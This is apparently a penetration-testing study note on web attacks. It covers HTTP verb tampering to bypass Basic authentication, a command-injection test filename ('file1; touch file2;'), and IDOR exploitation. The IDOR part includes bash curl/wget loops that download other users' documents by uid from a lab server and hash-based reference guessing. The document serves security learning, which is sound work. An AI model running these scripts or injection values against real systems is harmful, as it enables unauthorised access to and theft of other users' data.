# 🔓 IDOR(Insecure Direct Object References)

Basically change the _request method_

## Bypass Basic Authentication

Try to bypass authentication by changing request type (use burp for this).

Sometimes both GET and POST aren't covered.

To check accepted request types use OPTIONS

## Bypass security filters

If we try to create files with special characters like `test;` or any such security filter then try changing request method.

To check for command injection after creating a file try `file1; touch file2;`

If both files are created then command injection is present

The following is an example of a vulnerable configuration for an Apache web server, which is located in the site configuration file (e.g. `000-default.conf`), or in a`.htaccess`web page configuration file:

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

## IDOR(Insecure Direct Object References)

For example, if users request access to a file they recently uploaded, they may get a link to it such as (**download.php?file\_id=123**). So, as the link directly references the file with (**file\_id=123**), what would happen if we tried to access another file (which may not belong to us) with (**download.php?file\_id=124**) If we can access it that means there is a broken access control

### Identifying

Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (**e.g. ?uid=1 or ?filename=file\_1.pdf**). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.

**AJAX Calls**

We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.

Example:

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR. We can do the same with back-end code if we have access to it

**Hashing & Encoding**

Sometimes the reference is encoded like (**filename=ZmlsZV8xMjMucGRm**) Sometimes it is hashed like so (**download.php?filename=c81e728d9d4c2f636f067f89cc14862c**)

The code:

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

**Compare User Roles**

If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.

IF we had 2 users one of which can view the salary with the API call:

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"
}
```

Repeat same API call as `User 2` . If it works means that webapp requires only a valid logged-in session to make API call but no access control on backend to verify the data being called by the user.

### Enumeration

If uid is set like ( **uid=1**) And the files may be like

```
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

But when accessed with **uid=2**

```
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

There is an access control issue then we can try writing a bash script to extract files from all uids from 1 to 10.

Identify the link. In this case it is like so

```html
<li class="pure-tree_link"><a href="/documents/Invoice_1_09_2021.pdf" target="_blank">Invoice</a></li>

<li class="pure-tree_link"><a href="/documents/Report_1_10_2021.pdf" target="_blank">Report</a></li>
```

We can grep `grep "<li class='pure-tree_link'>"`&#x20;

We can use regex too `grep -oP "\/documents.*?.pdf"`

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

To match any file extension: `\/documents.*?\\.\\w+` Another example:

```bash
#!/bin/bash

url="http://94.237.63.83:38856/"

for i in {1..20}; do
    for link in $(curl -s -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/documents.*?\\.\\w+"); do
        curl -O $url/$link
    done
done
```

### Encoded

<figure><img src="../../.gitbook/assets/Web Attacks (2).png" alt=""><figcaption></figcaption></figure>

In this case it is md5 hash and the hash for uid does not match. If the function is in the frontend like `javascript:downloadContract('1')`

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

To try with uid=1 `echo -n 1 | base64 -w 0 | md5sum`

**Tip**: We are using the `-n` flag with echo, and the `-w 0` flag with _base64_, to avoid adding **newlines**, in order to be able to calculate the _md5_ hash of the same value, without hashing newlines, as that would change the final md5 hash.

To use in function:

```bash
#!/bin/bash

url=$1

for i in {1..20}; do
        # id = $(echo -n $i | base64 | jq -sRr @uri | sed 's/%0A//')
        for link in $(curl -s "$url/contracts.php" | grep -oP "javascript:downloadContract\('${i}'\)"); do
                echo $link
                wget -q $url/$link
        done
done
```

## Insecure APIs

Example api call:

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

Changing uid doesnt work The web application appears to be comparing the request's uid to the API endpoint (/1). This means that a form of access control on the back-end prevents us from arbitrarily changing some JSON parameters, which might be necessary to prevent the web application from crashing or returning errors.

So changing both url and the uid:&#x20;

<figure><img src="../../.gitbook/assets/Web Attacks-1 (1).png" alt=""><figcaption></figcaption></figure>

Now uuid mismatch

Can also try to create new user with POST request But now we get a message saying only admins can do that. This seems secure but we haven't tried GET request. We can acquire info with GET requests.

### Chaining IDOR Vulnerabilities

* Information disclosure with GET
*

    <figure><img src="../../.gitbook/assets/IDOR(Insecure Direct Object References) (1).png" alt=""><figcaption></figcaption></figure>
*   Changing info with acquired knowledge

    <figure><img src="../../.gitbook/assets/IDOR(Insecure Direct Object References)-1 (1).png" alt=""><figcaption></figcaption></figure>
